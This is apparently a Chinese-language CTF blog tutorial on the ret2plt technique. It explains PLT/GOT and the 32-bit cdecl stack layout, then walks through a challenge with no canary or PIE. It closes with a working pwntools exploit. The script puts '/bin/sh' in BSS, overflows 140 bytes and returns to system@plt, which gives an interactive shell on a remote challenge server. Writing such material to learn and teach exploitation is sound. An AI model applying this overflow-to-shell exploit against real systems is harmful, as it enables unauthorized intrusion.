---
title: Ret2plt
date: 2019-05-22 14:20:00
categories: 
  - Pwn
tags:
  - Pwn
---

# Ret2plt

## PLT 与 GOT

在动态链接的 ELF 程序里，当你调用一个外部库函数（如 puts），实际调用的是 PLT 表中的一个条目

这个条目会通过 GOT 表间接跳转到函数的真实地址

关键点：只要程序链接了某个函数（比如 `system`），即使代码里没出现过 `system`，它的 PLT 表项可能也会存在

更常见的情况是：程序虽然没有直接调用 `system`，但导入了 `system`，这样 `system@plt` 就是一个现成的跳板

## 核心思想

Ret2plt 就是利用栈溢出，将返回地址覆盖为某个函数的 PLT 表项地址（如 `system@plt`），并伪造好参数，从而调用该函数

因为 PLT 表位于程序的 `.plt` 段，在没有开启 PIE 的情况下地址固定（例如 `0x401030`），所以我们不需要知道 libc 的基址就能完成调用。这是它与 Ret2libc 最本质的区别

因此，Ret2plt 可以绕过 NX，同时不依赖 libc 地址泄露，是低版本或简单环境中非常优雅的攻击手法

## 实战案例

### 0xPwn（Ret2plt）

![](https://pic1.imgdb.cn/item/6a2d6b08f684928e3d6b1008.png)

没开金丝雀以及 PIE

![](https://pic1.imgdb.cn/item/6a2d6acdf684928e3d6b0ff9.png)

开局要先输入一个内容存放在 `&unk_804C00C`

![](https://pic1.imgdb.cn/item/6a2d7718f684928e3d6b6af8.png)

BSS 段不可执行代码，位置是 `0x0804C00C`

![](https://pic1.imgdb.cn/item/6a2d773cf684928e3d6b6b00.png)

函数 `sub_8049192()` 中存在栈溢出

![](https://pic1.imgdb.cn/item/6a2d7760f684928e3d6b6b02.png)

溢出大小是 140 字节

![](https://pic1.imgdb.cn/item/6a2d77c5f684928e3d6b6b0d.png)

因为没有给后门函数，所以思路是调用 `_system()` 函数，参数放在 BSS 段

**注意：如果该内存区域紧接着有残留的垃圾数据（比如 `AAAA...`），系统函数去读取时，就会把它们当成一个整体，试图去执行 `/bin/shAAAA...`。这会导致系统找不到该命令而报错**

所以我们需要加上 `\x00` 截断

在 32 位架构中，绝大多数 Linux 程序采用的是 `cdecl` 调用约定，32 位程序完全通过**栈**来传递函数参数

当一个正常的 32 位程序使用 call 指令调用函数时，栈的布局必须严格满足以下顺序（从低地址到高地址）：

- 函数的入口地址（触发调用）

- 函数的返回地址（函数执行完后，下一条指令去哪）

- 函数的参数 1

- 函数的参数 2 ...

在打 Pwn 时，如果没有要返回的地址，则默认填 0

```python
from pwn import *

system_addr = 0x08049050
p = remote('49.232.142.230', 15421)

p.sendafter('argument?','/bin/sh\x00')
p.sendlineafter('Name',b'A' * 140 + p32(system_addr) + p32(0) +p32(0x0804C00C))
p.interactive()
```